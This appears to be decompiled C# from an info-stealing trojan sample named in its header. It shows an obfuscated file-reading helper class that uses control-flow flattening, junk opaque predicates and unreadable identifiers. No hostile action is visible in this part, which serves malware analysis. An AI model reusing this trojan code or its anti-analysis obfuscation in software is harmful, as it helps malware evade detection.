// Decompiled with JetBrains decompiler
// Type:  
// Assembly: ProgIdRedirectionEn, Version=1.7.3.0, Culture=neutral, PublicKeyToken=null
// MVID: B81F1514-ABAD-442F-0D6D-30821B04B8DB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcqy-84d399a3116d4038d5730fdbae6857142c0141f042dbba9a42e8a21e1ce6448b.exe

using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

public class \u000F\u2001
{
  private byte[] \u0002;
  private int \u0003;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u000F\u2001()
  {
    \u0003\u2004.\u0002();
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public byte[] ValidateRepository() => this.\u0002;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public void \u0002(string _param1)
  {
    this.\u0002 = File.ReadAllBytes(_param1);
    this.\u0003 = 0;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public void \u0002(int _param1) => this.\u0003 = _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  private void \u0002()
  {
    if (this.\u0003 >= this.\u0002.Length)
      throw new EndOfStreamException();
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public byte \u0002() => this.\u0002(true);

  [MethodImpl(MethodImplOptions.NoInlining)]
  public byte \u0002(bool _param1)
  {
    int num1 = 5;
    byte num2;
    while (true)
    {
      byte num3;
      int num4;
      switch (num1)
      {
        case 0:
        case 3:
          num2 = num3;
          num4 = 6;
          break;
        case 1:
        case 2:
          num3 = this.\u0002[this.\u0003];
          num1 = 4;
          continue;
        case 4:
          if (_param1)
          {
            ++this.\u0003;
            goto case 0;
          }
          else
            goto case 0;
        case 5:
          this.\u0002();
          num4 = 2;
          break;
        case 6:
          goto label_9;
        default:
          num1 = 0;
          continue;
      }
      num1 = num4;
    }
label_9:
    return num2;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public bool \u0002() => this.\u0002(true);

  [MethodImpl(MethodImplOptions.NoInlining)]
  public bool \u0002(bool _param1)
  {
    int num1 = 2;
    bool flag1;
    while (true)
    {
      int num2 = num1;
      bool boolean;
      bool flag2;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            goto label_2;
          case 1:
          case 3:
            flag1 = boolean;
            num2 = 6;
            continue;
          case 4:
            if (flag2)
            {
              ++this.\u0003;
              goto case 1;
            }
            else
              goto case 1;
          case 5:
            goto label_8;
          case 6:
            goto label_9;
          default:
            goto label_7;
        }
      }
label_2:
      this.\u0002();
      num1 = 5;
      continue;
label_7:
      num1 = 1;
      continue;
label_8:
      boolean = BitConverter.ToBoolean(this.\u0002, this.\u0003);
      flag2 = _param1;
      num1 = 4;
    }
label_9:
    return flag1;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public double \u0002() => this.\u0002(true);

  [MethodImpl(MethodImplOptions.NoInlining)]
  public double \u0002(bool _param1)
  {
    int num1 = 1;
    double num2;
    while (true)
    {
      double num3;
      switch (num1)
      {
        case 0:
        case 1:
          this.\u0002();
          num1 = 5;
          continue;
        case 2:
        case 4:
          if (!_param1)
            break;
          goto case 3;
        case 3:
          this.\u0003 += 8;
          break;
        case 5:
          num3 = BitConverter.ToDouble(this.\u0002, this.\u0003);
          num1 = 4;
          continue;
        case 6:
          goto label_8;
        default:
          num1 = 3;
          continue;
      }
      num2 = num3;
      num1 = 6;
    }
label_8:
    return num2;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public int \u0002() => this.\u0002(true);

  [MethodImpl(MethodImplOptions.NoInlining)]
  public int \u0002(bool _param1)
  {
    int num1 = 4;
    int num2;
    while (true)
    {
      int num3 = num1;
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 1:
            goto label_7;
          case 2:
          case 3:
            goto label_6;
          case 4:
            goto label_5;
          case 5:
            goto label_1;
          case 6:
            goto label_9;
          default:
            num3 = 2;
            continue;
        }
      }
label_1:
      this.\u0003 += 4;
      goto label_6;
label_5:
      this.\u0002();
      num1 = 0;
      continue;
label_6:
      int int32;
      num2 = int32;
      num1 = 6;
      continue;
label_7:
      int32 = BitConverter.ToInt32(this.\u0002, this.\u0003);
      if (_param1)
        num1 = 5;
      else
        goto label_6;
    }
label_9:
    return num2;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public string \u0002() => this.\u0002(Encoding.Default, true);

  [MethodImpl(MethodImplOptions.NoInlining)]
  public string \u0002(Encoding _param1) => this.\u0002(_param1, true);

  [MethodImpl(MethodImplOptions.NoInlining)]
  public string \u0002(bool _param1) => this.\u0002(Encoding.Default, _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  public string \u0002(Encoding _param1, bool _param2)
  {
    int num1 = 4;
    string str1;
    while (true)
    {
      int num2 = num1;
      int count;
      string str2;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 4:
            goto label_1;
          case 1:
            if (_param2)
              this.\u0003 += count;
            str1 = str2;
            num2 = 6;
            continue;
          case 2:
          case 3:
            str2 = _param1.GetString(this.\u0002, this.\u0003 + (_param2 ? 0 : 4), count);
            goto case 1;
          case 5:
            goto label_2;
          case 6:
            goto label_10;
          default:
            if (\u000F\u2001.\u0002())
            {
              num2 = 1;
              continue;
            }
            goto label_10;
        }
      }
label_1:
      this.\u0002();
      num1 = 5;
      continue;
label_2:
      count = this.\u0002(_param2);
      num1 = 3;
    }
label_10:
    return str1;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public uint \u0002() => this.\u0002(true);

  [MethodImpl(MethodImplOptions.NoInlining)]
  public uint \u0002(bool _param1)
  {
    int num1 = 4;
    uint num2;
    while (true)
    {
      int num3 = num1;
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 4:
            this.\u0002();
            num3 = 5;
            continue;
          case 1:
          case 5:
            goto label_8;
          case 2:
            goto label_2;
          case 3:
            goto label_1;
          case 6:
            goto label_9;
          default:
            goto label_6;
        }
      }
label_1:
      uint uint32;
      num2 = uint32;
      num1 = 6;
      continue;
label_2:
      if (_param1)
      {
        this.\u0003 += 4;
        goto label_1;
      }
      else
        goto label_1;
label_6:
      num1 = 3;
      continue;
label_8:
      uint32 = BitConverter.ToUInt32(this.\u0002, this.\u0003);
      num1 = 2;
    }
label_9:
    return num2;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public ulong \u0002() => this.\u0002(true);

  [MethodImpl(MethodImplOptions.NoInlining)]
  public ulong \u0002(bool _param1)
  {
    int num1 = 1;
    ulong num2;
    while (true)
    {
      int num3 = num1;
      ulong uint64;
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 3:
            goto label_7;
          case 1:
            goto label_1;
          case 2:
          case 5:
            goto label_3;
          case 4:
            uint64 = BitConverter.ToUInt64(this.\u0002, this.\u0003);
            if (!\u000F\u2001.\u0003())
            {
              num3 = 5;
              continue;
            }
            goto label_3;
          case 6:
            goto label_9;
          default:
            num3 = 0;
            continue;
        }
      }
label_1:
      this.\u0002();
      num1 = 4;
      continue;
label_3:
      if (!_param1)
        goto label_8;
label_7:
      this.\u0003 += 8;
label_8:
      num2 = uint64;
      num1 = 6;
    }
label_9:
    return num2;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public DateTime \u0002() => this.\u0002(true);

  [MethodImpl(MethodImplOptions.NoInlining)]
  public DateTime \u0002(bool _param1)
  {
    int num1 = 3;
    DateTime dateTime1;
    while (true)
    {
      int num2 = num1;
      DateTime dateTime2;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            dateTime2 = new DateTime(1899, 12, 30, 0, 0, 0) + TimeSpan.FromDays(this.\u0002(_param1));
            goto case 2;
          case 2:
          case 4:
            dateTime1 = dateTime2;
            if (\u000F\u2001.\u0002())
            {
              num2 = 5;
              continue;
            }
            goto label_7;
          case 3:
            this.\u0002();
            num2 = 0;
            continue;
          case 5:
            goto label_7;
          default:
            goto label_4;
        }
      }
label_4:
      num1 = 4;
    }
label_7:
    return dateTime1;
  }

  internal static bool \u0002() => true;

  internal static bool \u0003() => false;
}
